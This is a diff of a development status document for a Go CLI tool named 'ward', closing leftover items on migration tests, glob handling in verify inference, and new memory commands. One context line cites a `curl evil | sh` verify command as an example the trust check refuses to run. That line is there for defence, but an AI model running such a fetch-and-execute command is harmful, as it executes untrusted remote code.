@@ -400,35 +400,34 @@ Acceptance met on this repo: first run auto-captured `test`/`verify`; second run
 routes them `tier=cheap` (`hit=true verify=verified`) via live re-verify; other
 nodes miss (logged). Unit-tested in `internal/cli/capture_test.go`.
 
-Still open (tracked, not for v0.1/v0.2): the four leftovers below.
+All four leftovers CLOSED (2026-08-22):
 
-### Leftovers (track, do not fix now)
+### Leftovers (CLOSED)
 
-- **`TestMigrationFromV1` tests the wrong era.** It opens a fresh DB (columns
-  already added), rewinds `user_version` to 1, reopens — the *b9bbe1d*
-  skip-if-present case. The *aadb0dc* case is tables **without** those columns;
-  `addColumn` should handle it but the test never builds that schema. ~10 lines,
-  next time store is touched.
-- **Resume overwrite has no regression test.** `resolveRunWF` is the fix; nothing
-  asserts a second `Engine` reloads `workflow_path` instead of the default YAML.
-- **`produces: ["*.go"]` is a literal, not a glob.** Harmless until contention
-  cares about the declared touched set.
-- **`go-test-demo` `verify` node is a `run: grep`, not `verification.Run` on an
-  artifact.** The naming will confuse the next reader.
+- **`TestMigrationFromV1` tests the wrong era — CLOSED.** Rewritten to build a
+  true *aadb0dc*-era DB (the three migrated tables WITHOUT escalation/context/
+  workflow_path) via a raw connection, then reopen with the current binary so
+  `addColumn` ALTERs them in idempotently. Covers the real missing-columns case.
+- **Resume overwrite regression test — CLOSED.** `TestResolveRunWFUsesPersistedPath`
+  asserts a second session reloads the run's persisted `workflow_path` (not the
+  oidc-login default) via `resolveRunWF`.
+- **`produces: ["*.go"]` literal, not glob — CLOSED.** `inferVerify` now expands
+  glob produces via `filepath.Glob` to a concrete file before hashing
+  (`TestCaptureNodeGlobProduces`).
+- **`go-test-demo` `verify` node was a `run: grep` mislabeled — CLOSED by the v0.3
+  inference fix** (below): a node now captures its own `run:` as the verify_cmd,
+  so the grep verify node records "grep passes", not "go test passes".
 
-### Inference nit (tracked, do not fix — v0.3 candidate, not v0.2.1)
+### Inference nit (CLOSED 2026-08-22)
 
-`inferVerify` maps `kind: test -> go test ./...`. Too coarse: `go-test-demo`'s
+`inferVerify` mapped `kind: test -> go test ./...` — too coarse: `go-test-demo`'s
 `verify` node is `kind: test` with `run: grep -rq WARD README.md`, so capture
-records a claim that **`go test` passes**, not that WARD is in the README. The
-second session routes cheap only because tests happen to still pass — the wrong
-claim is incidentally true.
+recorded a claim that **`go test` passes**, not that WARD is in the README.
 
-**Fix (when picked up):** default `verify_cmd` to the node's own `run:` (shell);
-only fall back to `go test ./...` when `run:` is empty. Hash-of-`produces`
-stays the non-test path. One function, `inferVerify`. Recapture note still holds:
-test-node content is stable so the claim is the `verify_cmd`; hash-node content
-carries the digest so a dirty file makes a new artifact.
+**Fix:** `inferVerify` now defaults `verify_cmd` to the node's own `run:` (shell);
+only falls back to `go test ./...` when `run:` is empty AND the node is a test.
+Hash-of-`produces` (with glob expansion) stays the non-test path. Covered by
+`TestCaptureNodeInfersRunNotGoTest` and `TestCaptureNodeGlobProduces`.
 
 None of these reopen the thesis.
 
@@ -460,14 +459,27 @@ routing/verify logic was not touched.
   put with a `curl evil | sh` verify_cmd is not local and never runs;
   `TestMemoryPutLocalTrust` asserts `--local`/`--by human` do mark local.
   Committed after the model-adapter work (post-v0.2.0, untagged).
-- **No `claim` command** (memory.md advisory coordination) — still open; gap once
-  two agents share a store.
-- **No `context` builder** (chef's compact injection block) — still open; `search`
-  + manual assembly only.
-- **`stale` has no direct CLI command** — still open; only surfaces via `handoff`.
-- **`router`/`route` hardcode `workflows/oidc-login.yaml`** as default path — still open.
+- **`claim` command — CLOSED (2026-08-22).** `ward memory claim add <topic>
+  [--by a] [--ttl m] [--strict]` is an advisory (no-locking) topic reservation
+  with overlap detection (warn, or error under `--strict`); `claim release
+  <topic>` / `claim list` manage active claims. Claims are stored as `kind:claim`
+  artifacts with a TTL; overlap is checked against accepted, non-expired claims.
+  Covered by `TestClaimLifecycle`.
+- **`context` builder — CLOSED (2026-08-22).** `ward memory context <query>`
+  prints a compact injection block (ids, kind, summary, tags, verify_status, no
+  full content). Covered by `TestContextCompactBlock`.
+- **`stale` CLI — CLOSED (2026-08-22).** `ward memory stale [--days N] [--mark
+  <id>]` surfaces stale/error/unknown artifacts (and rarely-used ones with
+  `--days`); `--mark` sets one stale by hand.
+- **`router`/`route` hardcoded default path — CLOSED (2026-08-22).** `ward
+  router` now resolves its workflow via `resolveRouterWF`: explicit `--workflow`
+  wins; else the seed demo workflow when seeding; else the most recent run's
+  persisted `workflow_path` (new `Store.LatestRun`); else the canonical demo
+  workflow as last resort. It no longer blindly forces oidc-login. `route` never
+  loaded a file at all, so unaffected.
 
 These remaining items do not reopen the thesis; the adapter was the "useful tool"
-blocker and the D0.3 trust gap was the blocker for multi-agent use.
+blocker and the D0.3 trust gap was the blocker for multi-agent use. With all of
+them closed, there are no known open items in the v0.1–v0.2 line or the review.
 
 
